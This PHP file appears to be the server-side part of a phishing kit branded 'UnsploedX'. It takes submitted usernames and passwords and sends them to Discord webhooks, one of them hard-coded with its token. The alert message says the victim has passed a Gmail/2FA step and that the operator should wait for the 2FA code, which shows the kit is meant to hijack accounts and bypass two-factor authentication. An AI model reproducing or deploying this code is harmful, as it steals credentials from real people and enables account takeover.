<?php
include ('setup.php');
$username = $_POST['username'];
$password = $_POST['password'];
$dwebhook = "https://discordapp.com/api/webhooks/848498199409066035/7g7IRZGlnh0yztwynCrZE8LTTVmHp7vd0ogU7Nd41y-Ca_VDmxLrGAjeVw1Qy-5PPUUI";
$hookObject = json_encode([
            "username" => "UnsploedX Notification",
            "avatar_url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif",
             "content" => "",
                "embeds" => [
                    [
                        "title" => 'Someone Logged In, But They Verified Gmail/2FA, Just Wait Until They Put The 2FA Code!',
                        "type" => "rich",
                        "url" => "https://discord.gg/MhjD6tmAWn",
                        "color" => hexdec("ff0000"),
                        "thumbnail" => [
                            "url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif"
                        ],
                        "author" => [
                             "name" => "",
                             "url" => ""
                        ],
                        "fields" => [
                            [
                                "name" => "Username",
                                "value" => "```" . $username . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "Password",
                                "value" => "```" . $password . "```",
                                "inline" => True
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$webhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
                $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$dwebhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
?>